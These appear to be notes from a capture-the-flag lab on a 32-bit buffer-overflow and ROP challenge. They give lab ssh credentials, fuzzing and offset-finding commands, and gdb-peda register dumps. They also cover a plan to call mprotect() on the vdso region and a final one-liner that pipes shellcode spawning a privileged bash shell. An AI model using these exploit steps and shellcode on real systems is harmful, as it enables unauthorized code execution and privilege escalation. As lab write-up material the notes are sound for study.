Level 0  ROP Challenge
----------------------
ssh level0@192.168.203.137
password: warmup


1. Fuzz

run < <(python -c 'print "A" * 52')

2. Discover EIP

Size 52
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6A

./pattern_offset.rb -q 0x35624134
[*] Exact match at offset 44


3. Overwrite EIP


run < <(python -c 'print "A" * 44 + "B" * 4')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xbffff69c --> 0x80ca720 --> 0xfbad2a84 
EDX: 0x80cb690 --> 0x0 
ESI: 0x80488e0 (<__libc_csu_fini>:	push   ebp)
EDI: 0x1914994d 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff6f0 --> 0x0 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff6f0 --> 0x0 
0004| 0xbffff6f4 --> 0xbffff784 --> 0xbffff8ac ("/home/level0/level0")
0008| 0xbffff6f8 --> 0xbffff78c --> 0xbffff8c0 ("XDG_SESSION_ID=1")
0012| 0xbffff6fc --> 0x0 
0016| 0xbffff700 --> 0x0 
0020| 0xbffff704 --> 0x0 
0024| 0xbffff708 --> 0x0 
0028| 0xbffff70c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()



4. Find ROP gadgets.

- Check for available functions




-------------------------------------------------------------------------------
x.py


a. Buffer Overflow
b. EIP to mprotect()
	- int mprotect(void *addr, size_t len, int prot);
	- clear out prior set arguments.
	- Search executable memory address for (ARGV 1)(vmmap)
	- Input size for (ARGV 2)
	- INPUT PERMISSION for (ARGV 3)




-------------------------------------------------------------------------------


-------------------------------------------------------------------------------
mprotect() - OK

The reason for using mprotect is so that we can make a portion of memory readable, writable and executable. This would provide us with somewhere to store our shell code, and somewhere to execute it from.

gdb-peda$ p mprotect
$3 = {<text variable, no debug info>} 0x80523e0 <mprotect>


- To make mprotect without error, we need to provide the proper amount
	of arguments.

int mprotect(void *addr, size_t len, int prot);
-------------------------------------------------------------------------------



5. Choose a stack to execute on

gdb-peda$ vmmap 
Start      End        Perm      Name
0x08048000 0x080ca000 r-xp      /home/level0/level0
0x080ca000 0x080cb000 rw-p      /home/level0/level0
0x080cb000 0x080ef000 rw-p      [heap]
0xb7ffd000 0xb7fff000 rw-p      mapped
0xb7fff000 0xb8000000 r-xp      [vdso]	<=================== This one.
0xbffdf000 0xc0000000 rw-p      [stack]

0xb7fff000





4.

python ./x.py; python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"';cat
